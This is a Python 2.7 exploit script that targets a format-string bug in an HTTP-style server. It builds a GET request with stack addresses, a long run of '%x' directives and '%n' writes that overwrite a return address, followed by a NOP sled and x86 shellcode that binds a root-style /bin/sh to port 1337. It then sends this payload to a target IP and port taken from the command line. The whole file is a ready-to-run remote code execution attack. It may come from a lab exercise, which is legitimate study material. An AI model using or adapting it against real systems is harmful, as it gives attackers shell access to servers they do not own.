#!/usr/bin/python2.7
# python2.7 because python3.x is weird about bytes in strings

# EMACS F'D UP MY COMMENT INDENTATIONS >:(

import socket
import select
import sys
import time

# how many %x chars to send
XDIRECTIVES = 263
BUFSIZE = 1024
NOPSIZE = 200

# port bind (1337) listen, and dup2 into execve to /bin/sh
SHELLCODE = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" + \
            "\x5b\x5e\x52\x68\x02\x39\x05\x39\x6a\x10\x51\x50\x89\xe1\x6a" + \
            "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" + \
            "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" + \
            "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" + \
            "\x0b\xcd\x80"


def exploit(target, payload):
    ''' Server only calls vulnerable printf after several requests back to us.
    Since data can arrive at any time in whatever order, use select to recv data when ready.
    Server may try to send back a formatted string with ~12,000,000 spaces, whoops.
    Reliest on user or exploit.sh intervention to close if exploit failed.
    Exploit known to fail if many other clients are talking on target server. '''
	
    global BUFSIZE
	
    # parse ip:port
    tmp = target.split(':')
    ip = tmp[0]
    port = int(tmp[1])

    try:
        print("attempting to send payload")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("payload sent")
        s.send(payload)
    except:
        print("failed to send payload")
        sys.exit(1)
        
    while 1:
        socklst = [s]
		
        # use s socket to recv from now on for target servers BS
        r, w, e = select.select(socklst, [], [])
        for sock in r:
            if sock == s:
                data = s.recv(BUFSIZE)
				
                # Target will close our connection when shellcode executes
                if not data:
                    print("target processed payload, closing deployment socket")
                    s.close()
                    sys.exit(0)
            else:
			
                # seriously though
                print("how does this even happen?")

def payload_gen():
    global XDIRECTIVES
    global SHELLCODE
    global NOPSIZE
    
    # we only ever write to 0xbfffee54 and 0xbfffee55
    # for some reason directly writing to 0xbfffee5{6,7} causes segfaults
    final = "GET \x54\xee\xff\xbfJUNK\x55\xee\xff\xbfJUNK\x56\xee\xff\xbfJUNK\x57\xee\xff\xbf"
    final += "%x" * XDIRECTIVES

    # two writes, one to 0xbfffee54 and other to 0xbfffee55
    # second one is HUGE due to segfault when direct write on 0xbfffee5{6,7}
    # causes EIP to land somewhere around 0xbffff495, I forget
    final += "%1x%n%12582136x%n"

    # bigger NOP sled makes this a little portable
    final += "\x90" * NOPSIZE

    final += SHELLCODE
	
    # pad other side of shellcode to protect it, just in case (learned the hard way)
    final += "\x90" * NOPSIZE
    final += " HTTP/1.0\r\n\r\n"
    
    return final

def usage():
    print("Usage: frmtexploit.py [target ip] [target port]")
    sys.exit(0)

def main():
    if len(sys.argv) != 3:
        usage()

    target = sys.argv[1] + ':' + sys.argv[2]
    payload = payload_gen()
    exploit(target, payload)

if __name__ == "__main__":
    main()
